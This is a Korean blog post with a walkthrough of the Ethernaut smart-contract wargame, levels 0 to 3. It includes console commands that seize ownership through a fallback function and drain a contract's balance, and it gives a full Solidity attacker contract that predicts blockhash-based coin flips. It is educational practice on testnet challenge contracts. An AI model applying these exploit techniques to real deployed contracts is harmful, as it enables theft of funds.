---
layout: post
title: "Ethernaut Solution"
date: 2018-09-19
description: # Add post description (optional)
img: leaves.jpg
tag: [Ethereum, Solidity, Ethernaut]
---

[Ethernaut][ethernaut]은 overthewire.org에 모방하여 만들어진 Web3/Solidity 워게임(wargame)입니다. 일종의 문제풀이식 게임으로 Solidity로 작성된 스마트 컨트랙트의 보안이슈와 관련된
모의해킹이라고 생각하면 되겠습니다. 각 레벨의 난이도는 최대 10이고 우측 상단에 표시되어 있습니다. 문제를 풀 수 있을 뿐만 아니라 새로운 문제를 만들어서 제출할 수도 있습니다.
PR은 언제나 열려있습니다! [Ethernaut Github][ethernaut-gh]

그럼 이제 레벨 0부터 시작해보기로 하겠습니다.

### 0. Hello Ethernaut (difficulty 0/10)
이 게임을 시작하려면 크롬 플러그인 메타마스크가 설치되어야 하며 이더리움 테스트넷인 <b>Ropsten</b>에 계정이 있어야 합니다. 물론 이더가 있어야 하는 것은 당연합니다.
Ropsten 계정에 이더를 [faucet][faucet]을 통해서 이더를 무료로 지급받을 수 있습니다. 아래 그림처럼 1 ether씩 받을 수 있습니다.

![fig01]({{site.baseurl}}/assets/img/ethernaut/ropsten_faucet.PNG)

Hello Ethernaut에 접속하여 다음과 같이 나오면 성공입니다. `F12`를 눌러서 개발자 도구를 항상 열어 놓아야 합니다. 플레이어의 주소가 바로 현재 열려있는 메타마스크 지갑의 계정주소가 되겠습니다.
게임은 텍스트 기반으로 진행되기 때문에 필요한 정보들은 개발자 도구의 콘솔을 통해 명령어를 입력하여 얻어야 합니다.

![fig02]({{site.baseurl}}/assets/img/ethernaut/ethernaut_hello_1.PNG)


예를 들어 콘솔에서 `help()`를 입력하면 도움말을 볼 수 있습니다. await getBalance(player)를 입력하면 현재 플레이어의 잔액을 알 수 있습니다. 대부분의 함수들이 비동기이므로 앞에 <b>await</b>를 붙여주도록 합니다.

![fig03]({{site.baseurl}}/assets/img/ethernaut/ethernaut_hello_2.PNG)

게임의 시작은 `Get new instance`를 누르면 시작할 수 있습니다. 게임에서 요구하는 결과를 만족시킨 후 `Submit instance`를 누르면 결과를 전송하고 블록체인에 영구히 기록됩니다.
해당 단계를 통과할 수 있습니다. 통과한 게임은 좌측 각 레벨 앞에 체크 표시가 됩니다.

기본적인 사용법을 알았으니 이제 0. Hello Ethernaut 에서 하라는 대로 진행을 해보겠습니다. 9번을 보면 이 단계를 통과하려면 `contract.info()`를 입력하라고 되어 있습니다.

> 9\. Interact with the contract to complete the level<br>Look into the levels's info method

{% highlight html %}
await contract.info()
"You will find what you need in info1()."
{% endhighlight %}

다시 `info1()`을 입력하면 필요한 정보를 얻을 것이라는 메시지가 나옵니다.

{% highlight html %}
await contract.info1()
"Try info2(), but with "hello" as a parameter."
{% endhighlight %}

다시 `info2()`을 입력하는데 이번에는 "hello" 라는 파라미터를 전달하라고 합니다. 😕

{% highlight html %}
await contract.info2("hello")
"The property infoNum holds the number of the next info method to call."
{% endhighlight %}

infoNum이라는 속성이 다음 info 메소드의 번호를 가지고 있다고 하네요. 시키는대로 계속 해보겠습니다.

{% highlight html %}
await contract.infoNum()
t {s: 1, e: 1, c: Array(1)}
{% endhighlight %}

결과는 BigNumber 형식으로 나왔습니다. 이 경우에는 직접 c의 값을 확인할 수도 있지만 다음과 같이 해봅시다.

{% highlight html %}
a = await contract.infoNum()
a.toNumber()
42
{% endhighlight %}

그렇다면 다음 메소드 이름은? 예, 맞습니다. `info42()`라는 의미가 아닐까요?

{% highlight html %}
await contract.info42()
"theMethodName is the name of the next method."
{% endhighlight %}

다음 힌트가 나왔습니다! 다음 메소드 이름은 "theMethodName" 이라고 합니다.

{% highlight html %}
await contract.theMethodName()
"The method name is method7123949."
{% endhighlight %}

드디어 최종 메소드 이름으로 보이는 메소드명이 나왔습니다. 실행해보니 아리송한 말이 나옵니다.
패스워드를 알고 있으면 그것을 authenticate()에 전달하라는 말인데...

{% highlight html %}
await contract.method7123949()
"If you know the password, submit it to authenticate()."
{% endhighlight %}

갑자기 패스워드라니? 다음과 같이 입력해봅니다.

{% highlight html %}
await contract.password()
"ethernaut0"
{% endhighlight %}

자, 이제 이것을 `authenticate()`의 파라미터로 전달해봅시다. 그러면 메타마스크가 뜨면서 이더리움에 상태변수를 변경시키는 트랜잭션을 전송하게 됩니다.
그리고 나서 `Submit instance`를 눌러봅니다. 패스워드가 맞길 바라면서...🥁

{% highlight html %}
await contract.authenticate("ethernaut0")
{% endhighlight %}


![fig04]({{site.baseurl}}/assets/img/ethernaut/ethernaut_hello_pass.PNG)

성공이군요!

이 문제의 힌트는 본문에 나와 있습니다.

> Tip: don't forget that you can always look in the contract's ABI!

패스워드는 문제에 주어진 컨트랙트의 password 함수를 호출하여 알아낼 수 있었습니다. `contract.abi`를 입력해봅시다. password 라는 함수가 public view 함수로
정의되어 있음을 알 수 있습니다(컨트랙트를 보면 password가 string public 이라서 getter 함수가 자동으로 생성되었습니다). 이를 통해 패스워드를 알아낼 수 있었던 것이죠.

이런 식으로 문제를 풀면서 각 단계를 진행하면 됩니다. 쉬워 보이죠? 하지만 난이도에 따라 별도의 컨트랙트를 작성해야 해결할 수 있는 문제들도 있습니다.


### 1. Fallback (difficulty 1/10)

이번 문제는 다음과 같은 결과를 얻으면 됩니다.

> 1. you claim ownership of the contract
> 2. you reduce its balance to 0

이 컨트랙트의 소유권을 가져오고 이 컨트랙트가 가진 잔액을 0으로 만들면 됩니다.
우선 주어진 컨트랙트를 분석해야 합니다.

Ownable 컨트랙트를 상속받은 것으로 보아 이 컨트랙트의 소유권은 컨트랙트를 배포한 계정에 있음을 짐작할 수 있습니다. 컨트랙트 생성자에서
소유 계정으로 1000 이더를 contributions "장부(mappings)"에 기록하였습니다.

{% highlight javascript %}
function Fallback() public {
    contributions[msg.sender] = 1000 * (1 ether);
}
{% endhighlight %}

다음 메소드 contribute를 보니 소유권이 바뀌는 조건은 컨트랙트 배포 계정(owner)보다 더 많은 이더를 contributions에 기록하면 됩니다.
하지만 앞에 있는 조건이 0.001 이더보다 작을 경우에만 저장을 하기 때문에 1000 이더보다 크게 만들려면(그럴만한 이더를 받는 것도 어렵고) 시간이
많이 걸리겠죠? 이 방법은 아닌 것 같습니다.

{% highlight javascript %}
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
{% endhighlight %}

그런데 다음과 같은 fallback 함수에서도 소유권이 변경되는 코드가 있습니다.

{% highlight javascript %}
function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
{% endhighlight %}

전송하는 이더가 0보다 크고 그 전에 이미 contributions에 이더 전송 기록이 있다면 소유권을 가져올 수 있을 것 같습니다.
게임을 시작해봅니다. `Get new instance`

배포된 컨트랙트의 소유계정을 조회해봅시다. 일단 플레이어는 아니군요.

{% highlight html %}
await contract.owner()
"0x234094aac85628444a82dae0396c680974260be7"
{% endhighlight %}

contribute 메소드를 실행해서 약간의 이더를 전송합니다. 조건에 의하면 0.001 이더보다 작으면 됩니다.
그리고 나서 getContribution 메소드로 정상적으로 contributions에 기록이 되었는지 조회해봅니다.


{% highlight html %}
await contract.contribute({from:player, value: toWei(0.0005)})
a = await contract.getContribution()
fromWei(a.toNumber())
"0.0005"
{% endhighlight %}

자, 이제 fallback 함수를 호출해서 소유권을 훔쳐올 차례입니다.😈

{% highlight html %}
sendTransaction({from:player, to: contract.address, value:toWei("0.001")})
{% endhighlight %}

트랜잭션이 마이닝된 후에 이 컨트랙트의 소유 계정을 조회합니다.

{% highlight html %}
await contract.owner()
"0x547d73355a851079e0395adb2c647821b74c7eaf"
{% endhighlight %}

플레이어의 계정으로 변경되었습니다! 이제 컨트랙트가 가진 이더를 전부 인출하겠습니다(미리 이 컨트랙트의 잔액을 조회합니다).


{% highlight html %}
await getBalance(contract.address)
"0.0015"
await contract.withdraw()
{% endhighlight %}

컨트랙트의 잔액을 다시 볼까요?

{% highlight html %}
await getBalance(contract.address)
"0"
{% endhighlight %}

성공입니다!


### 2. Fallout (difficulty 2/10)

이번 문제는 사실 알고나면 뭐 이런 문제가 다 있지 할 겁니다. 역시 컨트랙트의 소유권을 가져오는 것이 목적입니다.
그런데 주어진 컨트랙트를 살펴보니 소유권을 변경하는 곳은 생성자 밖에 없군요.

{% highlight javascript %}
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
{% endhighlight %}

솔리디티에서 생성자는 컨트랙트 이름과 동일합니다(자바 클래스 처럼). 하지만 지금 솔리디티 버전에서는 문법이 변경되어 <b>constructor</b>라는 키워드를 사용합니다.
그런데 위에 코드는 뭔가 이상합니다. Fallout이 컨트랙트 이름인데 생성자는 Fal<b><font color="red">1</font></b>out으로 되어 있습니다.
맞습니다. 오타입니다! 이 컨트랙트를 작성할 때 아마 잘못 작성한 것이지만 컴파일 오류는 나지 않을 겁니다. 컨트랙트가 반드시 생성자를 가져야 한다는 법이 없고
함수 이름 역시 영문자와 숫자가 가능하니까요.


### 3. Coin Flip (difficulty 3/10)

세 번째 문제부터는 좀 어렵습니다. 다른 컨트랙트를 작성해서 이 문제의 컨트랙트를 공격(?)해야 합니다("Beyond the console").
이 게임의 목표는 다음과 같습니다.

> To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

일종의 동전 던지기 게임인데 연속해서 10번을 이겨야 합니다. 아무리 확률이 50%라고는 하지만... 과연 연속 10번을 이길 수 있을까요? 아니면
다른 방법으로 10번(혹은 100번 이상)을 이길 수 있을까요? 😅

우선 주어진 컨트랙트를 살펴보겠습니다. 이 컨트랙트 인스턴스가 생성되면 연승기록이 0으로 초기화됩니다. 메소드 flip은 예측 값을 bool 타입 _guess로
전달받고 그것이 맞으면 true 틀리면 false를 리턴하도록 되어 있습니다. 그리고 예측 값이 맞으면 연승기록 카운터를 하나씩 증가시킵니다.

{% highlight javascript %}
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
  }
{% endhighlight %}

예측 값과 비교하는 난수발생 로직을 보면 블록해쉬 값을 사용하고 있습니다. 이 메소드를 실행하는 트랜잭션이 기록되는 블록의 앞에 있는
블록 해쉬를 사용하여 미리 정해진 상수 FACTOR로 나누어 몫이 1이면 true, 그렇지 않으면 false로 합니다.

그런데 난수는 어떤 숫자가 나올 지 모를 경우에만 난수로서의 의미가 있습니다. 이 트랜잭션을 실행하면서
기록될 블록의 해쉬는 사실 이 컨트랙트에 있는 로직처럼 누구나 알 수 있습니다. 다시 말해서 난수가 충분히 100% 예측 가능한 값이라는 말이 되겠습니다.

다음과 같은 새로운 컨트랙트를 작성할 수 있습니다. 이 컨트랙트에서는 공격 대상이 되는 문제의 CoinFlip 컨트랙트의 인스턴스를 생성하면서
난수 로직을 미리 실행하여 그 값을 flip 메소드에 전달합니다. 새로운 컨트랙트의 guess 메소드는 CoinFlip 컨트랙트의 flip 메소드를 실행하므로
해당 트랜잭션은 동일한 블록으로 마이닝될 것이므로 이전 블록 해쉬값은 동일하게 됩니다. 따라서 난수발생 로직을 미리 실행할 수 있는 것입니다.


{% highlight javascript %}
pragma solidity ^0.4.24;
contract hackCoinFlip {

   uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
   CoinFlip public coinFlip;
   address public owner;
   bool public result;

   constructor(address _addr) public {
       coinFlip = CoinFlip(_addr);
       owner = msg.sender;
   }

   modifier onlyOwner {
       require (msg.sender == owner, "Only owner can call this function.");
       _;
   }

   function guess() public onlyOwner returns (bool){

       uint256 blockValue = uint256(blockhash(block.number-1));
       uint flip = blockValue / FACTOR;
       bool side = flip == 1 ? true : false;

       result = coinFlip.flip(side);
       return result;
   }
}

contract CoinFlip {
    function flip(bool _guess) public returns (bool);
}
{% endhighlight %}

이렇게 되면 side의 값은 _guess 값과 항상 같은 값이 되므로 10번, 100번, 1000번 항상 이기는 게임이 되는 것입니다.
이를 위해서는 크롬의 콘솔에서는 할 수 없고 이미 배포된 CoinFlip 컨트랙트의 주소를 참조하여 [Remix][remix]에서 hackCoinFlip 컨트랙트를 Ropsten에 배포한 후
hackCoinFlip의 guess 메소드를 10번 실행하면 되겠습니다(Remix에서 메소드 실행).

📄Ropsten에 배포된 hackCoinFlip 컨트랙트 주소: 0x7944e8547aa437ed11a1e5cadba4019de440d40c


### 4. Telephone (difficulty 1/10)

이번 단계는 전화 교환원이 힌트입니다. 전화를 거는 사람과 중간에서 그 전화를 받아서 다른 사람에게 연결해 주는 교환원이 있는 상황 말입니다.
이 문제를 통해 `tx.origin` 과 `msg.sender`의 차이점을 이해할 수 있어야 합니다.



[ethernaut]: https://ethernaut.zeppelin.solutions/
[ethernaut-gh]: https://github.com/OpenZeppelin/ethernaut
[faucet]: https://faucet.metamask.io/
[remix]: http://remix.ethereum.org/

